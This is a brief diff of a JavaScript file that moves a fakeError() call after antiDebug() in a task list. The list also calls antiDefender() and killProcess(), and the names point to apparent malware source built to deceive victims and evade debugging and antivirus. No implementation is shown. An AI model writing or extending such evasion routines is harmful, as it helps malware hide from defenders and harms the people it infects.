@@ -12,8 +12,8 @@ const CONFIG = require('./config/config.js');
 async function aurita() {
     try {
         const tasks = [
-            fakeError(),
             antiDebug(),
+            fakeError(),
             antiDefender(),
             killProcess(),
         ];
